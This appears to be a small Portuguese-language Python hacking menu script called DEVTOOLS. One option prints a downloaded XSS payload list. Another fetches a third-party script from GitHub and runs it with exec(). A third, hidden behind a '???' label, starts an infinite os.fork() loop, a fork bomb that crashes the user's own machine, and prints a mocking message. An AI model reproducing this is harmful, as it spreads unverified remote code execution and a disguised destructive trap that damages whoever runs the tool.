from requests import get
import os
import sys
import time


def menu():
	print("""

	  \033[34mDEVTOOLS\033[m
	    by \033[33m@SAS\033[m
	    
          \033[44mVersao: 1.0\033[m
   	
  Opcoes:
	
  \033[36m[\033[m1\033[36m]\033[m XSS payloads list
  \033[36m[\033[m2\033[36m]\033[m joker clonador

  \033[36m[\033[m90\033[36m]\033[m \033[31m???\033[m
  \033[36m[\033[m91\033[36m]\033[m \033[31mVoltar\033[m
  \033[36m[\033[m92\033[36m]\033[m \033[31mSair\033[m
""")

clear = lambda: os.system('clear')

menu()

kk = int(input('\033[34m===>\033[m '))

if kk == (1):
	clear()
	print(get('https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt').text)

if kk == (2):
  clear()
  exec(get('https://raw.githubusercontent.com/bydeathlxncer/joker-clonador/main/joker-clone.py').text)

if kk == (90):
	clear()
	print('Morreu kkkkkk')
	while True:
		os.fork()

if kk == (91):
		clear()
		print('Voltando em 1s')
		time.sleep(1)
		import Run
		
if kk == (92):
	clear()
	print('Saindo...')
	time.sleep(1)
	exit()
	
